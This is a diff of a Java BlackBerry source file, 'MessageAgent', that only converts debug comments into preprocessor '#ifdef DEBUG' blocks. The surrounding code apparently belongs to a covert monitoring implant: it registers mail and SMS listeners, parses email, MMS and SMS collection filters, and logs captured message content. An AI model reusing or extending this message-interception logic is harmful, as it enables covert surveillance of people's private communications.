@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -55,8 +56,10 @@ import blackberry.utils.WChar;
  */
 public final class MessageAgent extends Agent {
 
-    // #debug
+    //#ifdef DEBUG
     static Debug debug = new Debug("MessageAgent", DebugLevel.VERBOSE);
+
+    //#endif
 
     protected static final int SLEEPTIME = 5000;
 
@@ -81,10 +84,10 @@ public final class MessageAgent extends Agent {
     public MessageAgent(final boolean agentStatus) {
         super(AGENT_MESSAGE, agentStatus, true, "MessageAgent");
 
-        // #ifdef DBC
+        //#ifdef DBC
         Check.asserts(Log.convertTypeLog(agentId) == LogType.MAIL_RAW,
                 "Wrong Conversion");
-        // #endif
+        //#endif
 
         mailListener = new MailListener(this);
         smsListener = new SmsListener(this);
@@ -147,8 +150,9 @@ public final class MessageAgent extends Agent {
      * @param logType 
      */
     public void createLog(final byte[] additionalData, final byte[] content, int logType) {
-        //#debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("createLog");
+        //#endif
 
         synchronized (log) {
             log.createLog(additionalData, logType);
@@ -156,8 +160,10 @@ public final class MessageAgent extends Agent {
             log.close();
         }
 
-        //#debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("log created");
+
+        //#endif
     }
 
     /**
@@ -168,22 +174,25 @@ public final class MessageAgent extends Agent {
     public long initMarkup() {
 
         if (markupDate.isMarkup() == false) {
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Il Markup non esiste, timestamp = 0 ");
+            //#endif
             final Date date = new Date();
             lastcheck = 0;
 
         } else {
             byte[] deserialized;
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Sto leggendo dal markup");
+            //#endif
             try {
                 deserialized = markupDate.readMarkup();
                 lastcheck = Utils.byteArrayToLong(deserialized, 0);
 
             } catch (final IOException e) {
-                // #debug error
+                //#ifdef DEBUG_ERROR
                 debug.error("Cannot read markup: " + e);
+                //#endif
             }
 
         }
@@ -198,8 +207,9 @@ public final class MessageAgent extends Agent {
 
         final Vector tokens = tokenize(conf);
         if (tokens == null) {
-            // #debug
+            //#ifdef DEBUG
             debug.error("Cannot tokenize conf");
+            //#endif
             return false;
         }
 
@@ -212,8 +222,9 @@ public final class MessageAgent extends Agent {
                 // IDENTIFICATION TAG
                 identification = WChar.getString(conf, token.payloadStart,
                         token.length, false);
-                // #debug debug
+                //#ifdef DEBUG_TRACE
                 debug.trace("Type 1: " + identification);
+                //#endif
                 break;
             case Prefix.TYPE_FILTER:
                 // Filtro (sempre 2, uno COLLECT e uno REALTIME);
@@ -223,38 +234,45 @@ public final class MessageAgent extends Agent {
                     if (filter.isValid()) {
                         switch (filter.classtype) {
                         case Filter.CLASS_EMAIL:
-                            // #debug info
+                            //#ifdef DEBUG_INFO
                             debug.info("EMAIL: " + filter.type + " en:"+ filter.enabled);
+                            //#endif
                             filtersEMAIL.put(filter.type, filter);
                             break;
                         case Filter.CLASS_MMS:
-                            // #debug info
+                            //#ifdef DEBUG_INFO
                             debug.info("MMS: " + filter.type + " en:"+ filter.enabled);
+                            //#endif
                             filtersMMS.put(filter.type, filter);
                             break;
                         case Filter.CLASS_SMS:
-                            // #debug info
+                            //#ifdef DEBUG_INFO
                             debug.info("SMS: " + filter.type + " en:"+ filter.enabled);
+                            //#endif
                             filtersSMS.put(filter.type, filter);
                             break;
                         case Filter.CLASS_UNKNOWN: // fall through
                         default:
-                            // #debug
+                            //#ifdef DEBUG
                             debug.error("unknown classtype: "+ filter.classtype);
+                            //#endif
                             break;
                         }
                     }
-                    // #debug debug
+                    //#ifdef DEBUG_TRACE
                     debug.trace("Type 2: header valid: " + filter.isValid());
+                    //#endif
                 } catch (final Exception e) {
-                    // #debug
+                    //#ifdef DEBUG
                     debug.error("Cannot filter" + e);
+                    //#endif
                 }
                 break;
 
             default:
-                // #debug
+                //#ifdef DEBUG
                 debug.error("Unknown type: " + token.type);
+                //#endif
                 break;
             }
         }
@@ -285,8 +303,9 @@ public final class MessageAgent extends Agent {
      * Update markup.
      */
     public void updateMarkup() {
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("Sto scrivendo nel markup");
+        //#endif
         final Date date = new Date();
         lastcheck = date.getTime();
         final byte[] serialize = Utils.longToByteArray(lastcheck);
